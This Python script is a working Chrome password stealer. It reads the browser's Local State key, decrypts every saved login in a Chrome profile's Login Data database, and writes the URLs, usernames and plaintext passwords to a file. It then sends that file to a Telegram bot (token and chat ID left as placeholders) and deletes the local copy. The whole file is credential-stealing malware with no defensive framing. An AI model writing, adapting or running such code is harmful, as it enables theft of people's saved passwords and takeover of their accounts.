import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta
from telegram import Bot, InputFile
import asyncio


async def send_to_telegram(file_path, bot_token, chat_id):
    bot = Bot(token=bot_token)
    with open(file_path, 'rb') as file:
        await bot.send_document(chat_id=chat_id, document=InputFile(file))


def get_encryption_key(local_state):
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv, password = password[3:15], password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


async def main():
    profile_names = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4"]

    for profile_name in profile_names:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", profile_name, "Login Data")

        if os.path.exists(db_path):
            break
    else:
        print("No valid profile found.")
        return

    try:
        with open(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data",
                               "Local State"), "r", encoding="utf-8") as f:
            local_state = json.load(f)

        key = get_encryption_key(local_state)

        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)

        with sqlite3.connect(filename) as db:
            cursor = db.cursor()

            current_datetime = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            output_filename = f"login_data_{current_datetime}.txt"

            with open(output_filename, 'w') as file:
                cursor.execute(
                    "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
                for row in cursor.fetchall():
                    origin_url, action_url, username, password = row[0], row[1], row[2], decrypt_password(row[3], key)
                    if username or password:
                        login_data = f"Origin URL: {origin_url} \n" \
                                     f"Action URL: {action_url} \n" \
                                     f"Username: {username}\n" \
                                     f"Password: {password}\n"
                        file.write(login_data)

        bot_token = 'BOT_TOKEN'
        chat_id = 'CHANNEL_ID'

        loop = asyncio.get_event_loop()
        await send_to_telegram(output_filename, bot_token, chat_id)

        os.remove(output_filename)
        print(f"Login data sent to Telegram and removed from desktop for profile '{profile_name}'.")

    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
